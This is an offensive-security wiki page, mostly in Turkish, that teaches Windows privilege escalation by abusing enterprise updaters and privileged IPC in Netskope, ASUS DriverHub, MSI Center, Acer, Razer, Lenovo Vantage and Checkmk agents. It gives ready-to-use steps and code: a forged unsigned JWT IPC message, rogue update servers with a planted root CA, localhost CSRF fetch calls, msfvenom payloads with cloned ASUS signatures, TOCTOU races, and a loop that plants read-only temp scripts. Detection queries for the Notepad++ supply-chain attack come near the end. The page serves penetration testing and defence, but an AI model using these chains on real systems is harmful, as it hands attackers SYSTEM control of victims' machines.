# Enterprise Auto-Updaters ve Privileged IPC kötüye kullanımı (örn. Netskope, ASUS ve MSI)

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, enterprise endpoint agent’larında ve updater’larda bulunan, düşük sürtünmeli bir IPC yüzeyi ve privileged update flow açığa çıkaran bir Windows local privilege escalation zinciri sınıfını genelleştirir. Temsili bir örnek, Netskope Client for Windows < R129 (CVE-2025-0309)’dır; burada düşük yetkili bir kullanıcı, enrollment’ı attacker-controlled bir server’a zorlayabilir ve ardından SYSTEM service’in kuracağı malicious bir MSI teslim edebilir.

Yeniden kullanabileceğin temel fikirler:
- Attacker server’a yeniden enrollment veya reconfiguration zorlamak için privileged service’in localhost IPC’sini kötüye kullan.
- Vendor’un update endpoint’lerini implement et, rogue Trusted Root CA teslim et ve updater’ı malicious, “signed” bir package’a yönlendir.
- Zayıf signer kontrollerini (CN allow-lists), opsiyonel digest flag’lerini ve gevşek MSI properties’lerini aş.
- IPC “encrypted” ise, registry’de saklanan ve world-readable machine identifiers’dan key/IV türet.
- Service çağıranları image path/process name ile kısıtlıyorsa, allow-listed bir process’e inject et veya birini suspended olarak başlat ve minimum bir thread-context patch ile DLL’ini bootstrap et.

---
## 1) localhost IPC üzerinden attacker server’a enrollment zorlamak

Birçok agent, localhost TCP üzerinden JSON kullanarak SYSTEM service ile konuşan user-mode UI process’i ile birlikte gelir.

Netskope’da gözlemlenen:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Backend host’u (örn. AddonUrl) kontrol eden claim’lere sahip bir JWT enrollment token oluştur. İmza gerekmemesi için alg=None kullan.
2) Provisioning command’ını çağıran IPC mesajını, JWT’n ve tenant name ile gönder:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Servis, enrollment/config için rogue sunucunuza istek atmaya başlar, örn.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notlar:
- Eğer caller verification path/name-based ise, isteği allow-listed bir vendor binary’den başlatın (bkz. §4).

---
## 2) update channel’ını hijack ederek code’u SYSTEM olarak çalıştırmak

Client sizin sunucunuzla konuşmaya başladıktan sonra, beklenen endpoints’i implement edin ve onu bir attacker MSI’a yönlendirin. Tipik sequence:

1) /v2/config/org/clientconfig → Çok kısa bir updater interval içeren JSON config döndürün, örn.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Bir PEM CA certificate döndürür. Service bunu Local Machine Trusted Root store içine kurar.
3) /v2/checkupdate → Kötü amaçlı bir MSI ve sahte bir sürümü işaret eden metadata sağlayın.

Sahada görülen yaygın kontrolleri aşma:
- Signer CN allow-list: service yalnızca Subject CN değeri “netSkope Inc” veya “Netskope, Inc.” ise kontrol edebilir. Sizin rogue CA’nız bu CN ile bir leaf çıkarabilir ve MSI’ı imzalayabilir.
- CERT_DIGEST property: CERT_DIGEST adlı zararsız bir MSI property ekleyin. Install sırasında zorunlu kontrol yok.
- Optional digest enforcement: config flag (ör. check_msi_digest=false) ekstra kriptografik doğrulamayı devre dışı bırakır.

Sonuç: SYSTEM service, MSI’ınızı şuradan kurar:
C:\ProgramData\Netskope\stAgent\data\*.msi
ve NT AUTHORITY\SYSTEM olarak keyfi code çalıştırır.

Patch-bypass dersi: Eğer bir vendor, update source’u kriptografik olarak doğrulamak yerine küçük bir “trusted” domain listesi allow-list ederek yanıt veriyorsa, trafiği hâlâ yönlendirmenize izin veren vendor-owned redirector veya reverse proxy’leri arayın. Netskope örneğinde, public follow-up research R129 dönemine ait bir allow-list’in hâlâ `rproxy.goskope.com` üzerinden kötüye kullanılabildiğini gösterdi; bu da attacker-controlled Azure App Service content’ini proxy’liyordu. Hostname allow-list’leri bir trust boundary değil, sadece bir hız kesici olarak görün.

---
## 3) Şifrelenmiş IPC requests forging (varsa)

R127’den itibaren Netskope, IPC JSON’u Base64 gibi görünen bir encryptData field içinde sarmalıyordu. Reverse analysis, herhangi bir kullanıcı tarafından okunabilen registry değerlerinden türetilen key/IV ile AES kullanıldığını gösterdi:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers bu encryption’ı yeniden üretebilir ve standart bir user’dan geçerli şifrelenmiş komutlar gönderebilir. Genel ipucu: bir agent aniden IPC’sini “encrypt” etmeye başlarsa, HKLM altında device ID’leri, product GUID’leri, install ID’leri gibi materyaller arayın.

---
## 4) IPC caller allow-lists aşma (path/name checks)

Bazı service’ler, TCP connection’ın PID’sini çözüp image path/name’i Program Files altında bulunan allow-listed vendor binary’leriyle karşılaştırarak peer’i authenticate etmeye çalışır (ör. stagentui.exe, bwansvc.exe, epdlp.exe).

İki pratik bypass:
- Allow-listed bir process içine DLL injection yapıp IPC’yi içinden proxy etmek (ör. nsdiag.exe).
- CreateRemoteThread kullanmadan allow-listed bir binary’yi suspended başlatıp proxy DLL’inizi bootstrap etmek (bkz. §5), böylece driver-enforced tamper kurallarını karşılamak.

---
## 5) Tamper-protection dostu injection: suspended process + NtContinue patch

Ürünler çoğu zaman protected process’lere açılan handle’lardan tehlikeli rights’ları kaldırmak için bir minifilter/OB callbacks driver (ör. Stadrv) ile gelir:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME kaldırılır
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE ile kısıtlanır

Bu kısıtları dikkate alan güvenilir bir user-mode loader:
1) CREATE_SUSPENDED ile bir vendor binary’si için CreateProcess çağırın.
2) Hâlâ izin verilen handle’ları alın: process üzerinde PROCESS_VM_WRITE | PROCESS_VM_OPERATION ve thread handle üzerinde THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (veya kodu bilinen bir RIP’de patch’liyorsanız sadece THREAD_RESUME).
3) ntdll!NtContinue (veya erken, kesin map edilen başka bir thunk) üzerine, DLL path’inizde LoadLibraryW çağıran küçük bir stub yazın, sonra geri zıplatın.
4) Stub’ı process içinde tetiklemek için ResumeThread kullanın ve DLL’inizi yükleyin.

Zaten protected olan bir process üzerinde PROCESS_CREATE_THREAD veya PROCESS_SUSPEND_RESUME kullanmadığınız için (çünkü onu siz oluşturdunuz), driver’ın policy’si karşılanır.

---
## 6) Pratik tooling
- NachoVPN (Netskope plugin) rogue CA oluşturmayı, kötü amaçlı MSI signing’i ve gerekli endpoint’leri sunmayı otomatikleştirir: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope, keyfi (isteğe bağlı AES-encrypted) IPC messages hazırlayan ve allow-listed bir binary’den çıkmış gibi görünmek için suspended-process injection içeren özel bir IPC client’tır.

## 7) Bilinmeyen updater/IPC yüzeyleri için hızlı triage workflow

Yeni bir endpoint agent veya motherboard “helper” suite ile karşılaştığınızda, kısa bir workflow genellikle privesc hedefiyle karşı karşıya olup olmadığınızı anlamak için yeterlidir:

1) Loopback listener’ları enumerate edin ve bunları vendor process’lerine eşleyin:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Aday named pipe’ları enumerate et:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Plugin-based IPC servers tarafından kullanılan registry-backed routing verilerini mine edin:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Önce user-mode client'tan endpoint adlarını, JSON keys ve command IDs'leri çıkarın. Packed Electron/.NET frontends sıklıkla tam schema'yı leak eder:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Süreci sonunda başlatan code path’i değil, asıl trust predicate’i avlayın:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Önceliklendirilmeye değer kalıplar:
- `CryptQueryObject`/certificate parsing’in `WinVerifyTrust` olmadan kullanılması, genellikle “certificate exists”in “certificate is trusted” olarak ele alındığı anlamına gelir; bu da certificate cloning veya diğer fake-signer hilelerini mümkün kılar.
- `Origin`, `Referer`, download URLs, process names veya signer CN’ler üzerinde yapılan substring/suffix kontrolleri authentication değildir. `contains(".vendor.com")` genellikle attacker-controlled lookalike domain’lerle exploit edilebilir.
- Düşük yetkili GUI “file is trusted” kararını veriyor ve SYSTEM broker sadece bu sonucu tüketiyorsa, client-side DLL/JS’i patch etmek veya yeniden implemente etmek çoğu zaman sınırı tamamen bypass eder (Razer-style split validation).
- Broker bir payload’u `%TEMP%`/`C:\Windows\Temp` içine kopyalayıp ardından onu bu path’ten validate ediyorsa veya schedule ediyorsa, hemen TOCTOU replacement window’ları ve daha zayıf checks içeren alternate `ExecuteTask()` wrappers sunan sibling plugin module’leri test edin.

Named-pipe ağırlıklı hedeflerde PipeViewer, protocol’ü derinlemesine reverse etmeye başlamadan önce weak DACL’leri ve remotely reachable pipes’ı hızlıca tespit etmenin iyi bir yoludur.

Target, çağıranları yalnızca PID, image path veya process name ile authenticate ediyorsa, bunu bir boundary’den çok bir speed bump olarak değerlendirin: legitimate client içine inject etmek veya connection’ı allow-listed bir process’ten yapmak çoğu zaman server’ın checks’ini geçmek için yeterlidir. Özellikle named pipes için, [client impersonation ve pipe abuse hakkındaki bu sayfa](named-pipe-client-impersonation.md) bu primitive’i daha derin anlatır.

---
## 8) Sadece vendor signatures ile authenticate edilen modüler add-in broker’ları (Lenovo Vantage pattern)

Avlanmaya değer daha yeni bir varyasyon **signed-client RPC broker**’dır: düşük yetkili, vendor-signed bir Lenovo desktop process’i bir SYSTEM service ile konuşur ve service JSON commands’larını `%ProgramData%` altındaki XML ile tanımlanan bir dizi add-in’e yönlendirir. Accepted signed client’lardan herhangi biri içinde code execution elde edildiğinde, her `runas="system"` contract attack surface’inizin parçası haline gelir.

Lenovo Vantage research’ünde gözlenen yüksek değerli primitive’ler:
- **Vendor tarafından signed olduğu için caller’a güvenmek**: araştırmacılar, Lenovo-signed bir EXE’yi writable bir directory’ye kopyalayıp DLL side-load (`profapi.dll`) şartını sağlayarak authenticated bir context’e ulaştılar; böylece service’in zaten trusted olduğu bir client içinde arbitrary code çalıştı.
- **Manifest odaklı attack surface keşfi**: add-in’ler `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` altında tanımlanır; birkaç contract `SYSTEM` olarak çalışır, bu yüzden bu manifest’leri enumerate etmek çoğu zaman broker’ın kendisini reverse etmekten daha hızlı şekilde gerçek privileged verbs’i ortaya çıkarır.
- **Authenticated channel arkasındaki command bazlı bugs**: trusted client içine girildikten sonra public research, update/install verbs’lerinde path-traversal + race conditions, privileged settings databases üzerinde raw-SQL abuse ve intended hive dışına write yapılmasını sağlayan substring tabanlı registry path checks buldu.

Hedef üzerinde faydalı recon:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Pratik çıkarım: bir yardımcı paket, önce **caller process**’i kimlik doğrulayan ve ardından onlarca plugin/add-in komutuna yönlendiren bir broker sunduğunda, front-door trust check’i aşmakla yetinmeyin. Manifest/contract tablosunu döküp her yüksek yetkili verb’i ayrı ayrı fuzz’layın; authenticated channel genellikle birkaç ikinci aşama bug’ı gizler.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub, 127.0.0.1:53000 üzerinde browser çağrılarını https://driverhub.asus.com adresinden gelmiş gibi bekleyen user-mode bir HTTP service (ADU.exe) ile gelir. Origin filtresi, yalnızca Origin header’ı ve `/asus/v1.0/*` üzerinden sunulan download URL’leri üzerinde `string_contains(".asus.com")` uygular. Bu nedenle `https://driverhub.asus.com.attacker.tld` gibi attacker-controlled bir host bile kontrolü geçer ve JavaScript’ten state-changing requests gönderebilir. Ek bypass pattern’leri için [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) bölümüne bakın.

Pratik akış:
1) `.asus.com` içeren bir domain kaydedin ve orada malicious bir webpage barındırın.
2) `fetch` veya XHR kullanarak `http://127.0.0.1:53000` üzerindeki privileged endpoint’e (ör. `Reboot`, `UpdateApp`) çağrı yapın.
3) Handler’ın beklediği JSON body’yi gönderin – packed frontend JS aşağıdaki schema’yı gösterir.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Aşağıda gösterilen PowerShell CLI bile Origin başlığı güvenilir değere sahte olarak ayarlandığında başarılı olur:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Attacker site’a yapılan herhangi bir browser ziyareti böylece SYSTEM helper’ı çalıştıran 1-click (veya `onload` ile 0-click) local CSRF olur.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` JSON body içinde tanımlanan keyfi executables dosyalarını indirir ve bunları `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` altında cache’ler. Download URL validation aynı substring mantığını yeniden kullanır, bu yüzden `http://updates.asus.com.attacker.tld:8000/payload.exe` kabul edilir. Download’dan sonra ADU.exe yalnızca PE içinde bir signature olup olmadığını ve çalıştırmadan önce Subject string’inin ASUS ile eşleşip eşleşmediğini kontrol eder – `WinVerifyTrust` yok, chain validation yok.

Bu akışı weaponize etmek için:
1) Bir payload oluşturun (örneğin, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS’un signer’ını bunun içine clone edin (örneğin, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `pwn.exe` dosyasını `.asus.com` benzeri bir domain üzerinde host edin ve yukarıdaki browser CSRF ile UpdateApp’i tetikleyin.

Hem Origin hem de URL filtreleri substring-based olduğu ve signer check yalnızca string’leri karşılaştırdığı için, DriverHub attacker binary’sini elevated context altında çeker ve çalıştırır.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’ın SYSTEM service’i, her frame’in `4-byte ComponentID || 8-byte CommandID || ASCII arguments` olduğu bir TCP protocol sunar. Core component (Component ID `0f 27 00 00`) `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` ile gelir. Handler’ı:
1) Sağlanan executable’ı `C:\Windows\Temp\MSI Center SDK.exe` içine kopyalar.
2) Signature’ı `CS_CommonAPI.EX_CA::Verify` ile doğrular (certificate subject “MICRO-STAR INTERNATIONAL, CO., LTD.” olmalı ve `WinVerifyTrust` başarılı olmalı).
3) Temp dosyasını attacker-controlled arguments ile SYSTEM olarak çalıştıran bir scheduled task oluşturur.

Kopyalanan dosya, verification ile `ExecuteTask()` arasında kilitlenmez. Bir attacker:
- Meşru MSI-signed binary’ye işaret eden Frame A gönderebilir (signature check’in geçmesini ve task’in queue’ya alınmasını garanti eder).
- Bunu, malicious payload’a işaret eden tekrarlı Frame B mesajlarıyla race ederek `MSI Center SDK.exe` dosyasını verification biter bitmez overwrite edebilir.

Scheduler çalıştığında, orijinal dosya doğrulanmış olsa bile overwrite edilmiş payload’ı SYSTEM altında çalıştırır. Güvenilir exploitation, `CMD_AutoUpdateSDK`’yi TOCTOU window kazanılana kadar spam’leyen iki goroutine/thread kullanır.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe` tarafından yüklenen her plugin/DLL, `HKLM\SOFTWARE\MSI\MSI_CentralServer` altında saklanan bir Component ID alır. Bir frame’in ilk 4 byte’ı bu component’i seçer; bu da attacker’ların komutları arbitrary modules’a yönlendirmesine izin verir.
- Plugins kendi task runner’larını tanımlayabilir. `Support\API_Support.dll`, `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` değerini expose eder ve `API_Support.EX_Task::ExecuteTask()` çağrısını doğrudan, **signature validation olmadan** yapar – herhangi bir local user bunu `C:\Users\<user>\Desktop\payload.exe` için ayarlayıp deterministik olarak SYSTEM execution elde edebilir.
- Wireshark ile loopback sniff etmek veya dnSpy içinde .NET binaries’lerini instrument etmek Component ↔ command mapping’i hızlıca ortaya çıkarır; ardından custom Go/ Python clients frame’leri replay edebilir.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM), `\\.\pipe\treadstone_service_LightMode` açığa çıkarır ve discretionary ACL, remote clients’a da izin verir (örneğin, `\\TARGET\pipe\treadstone_service_LightMode`). Command ID `7` ile bir file path gönderildiğinde, service’in process-spawning routine’i çağrılır.
- Client library, arg’larla birlikte magic terminator byte (113) serialize eder. Frida/`TsDotNetLib` ile yapılan dynamic instrumentation (instrumentation ipuçları için [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) bölümüne bakın) native handler’ın `CreateProcessAsUser` çağrısından önce bu değeri bir `SECURITY_IMPERSONATION_LEVEL` ve integrity SID’e map ettiğini gösterir.
- 113 (`0x71`) yerine 114 (`0x72`) kullanmak, generic branch’e düşürür; bu branch full SYSTEM token’ı korur ve high-integrity bir SID (`S-1-16-12288`) ayarlar. Böylece spawned binary hem local hem de cross-machine olarak unrestricted SYSTEM altında çalışır.
- Bunu exposed installer flag’i (`Setup.exe -nocheck`) ile birleştirerek ACC’yi lab VM’lerde bile ayağa kaldırın ve vendor hardware olmadan pipe’ı test edin.

Bu IPC bug’ları, localhost services’in neden mutual authentication zorlaması gerektiğini (ALPC SIDs, `ImpersonationLevel=Impersonation` filtreleri, token filtering) ve neden her module’ün “run arbitrary binary” helper’ının aynı signer verification’ları paylaşması gerektiğini gösterir.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4, bu aileye başka bir faydalı pattern ekledi: düşük yetkili bir user, COM helper’a `RzUtility.Elevator` üzerinden process launch ettirebilir; trust kararı ise privileged boundary içinde güçlü biçimde zorlanmak yerine user-mode DLL (`simple_service.dll`) üzerine bırakılır.

Gözlemlenen exploitation yolu:
- COM object `RzUtility.Elevator` instantiate edin.
- Yükseltilmiş bir launch istemek için `LaunchProcessNoWait(<path>, "", 1)` çağırın.
- Public PoC’de, request gönderilmeden önce `simple_service.dll` içindeki PE-signature gate patch edilir; böylece attacker’ın seçtiği keyfi executable çalıştırılabilir.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Genel çıkarım: “helper” paketlerini tersine mühendislik yaparken, yalnızca localhost TCP veya named pipe ile sınırlı kalmayın. `Elevator`, `Launcher`, `Updater` veya `Utility` gibi adlara sahip COM classes olup olmadığını kontrol edin, ardından privileged service’in gerçekten hedef binary’yi doğrulayıp doğrulamadığını ya da sadece patch edilebilir bir user-mode client DLL tarafından hesaplanan sonuca güvenip güvenmediğini inceleyin. Bu desen Razer’ın ötesine genellenir: yüksek yetkili broker’ın düşük yetkili taraftan gelen bir allow/deny kararını tükettiği herhangi bir split design, potansiyel bir privesc surface’tir.


---
## MSI repair sırasında öngörülebilir temp script execution (Checkmk Agent / CVE-2024-0670)

Bazı Windows agent’ları hâlâ privileged actions’ı `C:\Windows\Temp` içine geçici bir `.cmd` yazarak ve bunu `SYSTEM` olarak çalıştırarak uygular. Dosya adı öngörülebilir ise ve service mevcut dosyaları güvenli şekilde yeniden oluşturmuyorsa, düşük yetkili bir kullanıcı gelecekteki temp dosyasını önceden **read-only** olarak oluşturup privileged process’in kendi script’i yerine saldırgan kontrollü içeriği çalıştırmasını sağlayabilir.

Vulnerable Checkmk Agent build’lerinde gözlemlendi:
- temp pattern: `cmk_all_<PID>_1.cmd`
- etkilenen branches: `2.0.0`, `2.1.0`, `2.2.0`
- tetikleyici: önbelleğe alınmış agent package’ın MSI **repair** işlemi

Pratik iş akışı:
1. Mevcut process ID’lerden veya çalışan agent PID’sinden gerçekçi bir PID aralığı tahmin edin.
2. Kısa bir **ASCII** `.cmd` payload yazın (`Set-Content -Encoding Ascii` veya `cmd.exe` redirection; batch dosyaları için UTF-16 PowerShell output’tan kaçının).
3. `C:\Windows\Temp\cmk_all_<PID>_1.cmd` dosyasını aday aralık boyunca yayın ve her dosyayı read-only olarak işaretleyin.
4. Privileged service’in temp script’i yeniden oluşturmaya çalışıp ardından çalıştırması için önbelleğe alınmış MSI’ın repair işlemini tetikleyin.
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Eğer savunmasız ürün Windows Installer ile kurulmuşsa, onarımı tetiklemeden önce `C:\Windows\Installer` altındaki rastgele görünümlü önbelleğe alınmış MSI dosyasını ürün adına geri eşle:
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Operational notes:
- `qwinsta` is useful when `msiexec /fa` fails from a non-interactive WinRM shell and you need to understand whether an existing desktop/disconnected session can trigger the repair correctly.
- This pattern generalizes to other endpoint agents and updaters that **stage temp scripts in world-writable locations and later execute them as SYSTEM**. Test for predictable names, missing exclusive create semantics, and repair/update flows that can be triggered on demand.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Between June 2025 and December 2025, attackers who compromised the hosting infrastructure behind the Notepad++ update flow selectively served malicious manifests to chosen victims. Older WinGUp-based updaters did not fully verify update authenticity, so a hostile XML response could redirect clients to attacker-controlled URLs. Because the client accepted HTTPS content without enforcing both a trusted certificate chain and a valid PE signature on the downloaded installer, victims fetched and executed a trojanized NSIS `update.exe`.

Operational flow (no local exploit required):
1. **Infrastructure interception**: compromise CDN/hosting and answer update checks with attacker metadata pointing at a malicious download URL.
2. **Trojanized NSIS**: the installer fetches/executes a payload and abuses two execution chains:
- **Bring-your-own signed binary + sideload**: bundle the signed Bitdefender `BluetoothService.exe` and drop a malicious `log.dll` in its search path. When the signed binary runs, Windows sideloads `log.dll`, which decrypts and reflectively loads the Chrysalis backdoor (Warbird-protected + API hashing to hinder static detection).
- **Scripted shellcode injection**: NSIS executes a compiled Lua script that uses Win32 APIs (e.g., `EnumWindowStationsW`) to inject shellcode and stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** of the downloaded installer (pin vendor signer, reject mismatched CN/chain) and sign the update manifest itself (e.g., XMLDSig). Block manifest-controlled redirects unless validated.
- Treat **BYO signed binary sideloading** as a post-download detection pivot: alert when a signed vendor EXE loads a DLL name from outside its canonical install path (e.g., Bitdefender loading `log.dll` from Temp/Downloads) and when an updater drops/executes installers from temp with non-vendor signatures.
- Monitor **malware-specific artifacts** observed in this chain (useful as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, and Lua-driven shellcode injection stages.
- Notepad++ responded by strengthening WinGUp in v8.8.9 and later: the returned XML is now signed (XMLDSig), and newer builds enforce certificate + signature verification of the downloaded installer instead of trusting the transport alone.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> launching a non-Notepad++ installer</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Bu pattern'ler, unsigned manifest kabul eden veya installer signer’larını pinlemeyi başarısız olan herhangi bir updater için genellenebilir—network hijack + malicious installer + BYO-signed sideloading, “trusted” updates kılıfı altında remote code execution sağlar.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [RunasCs](https://github.com/antonioCoco/RunasCs)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
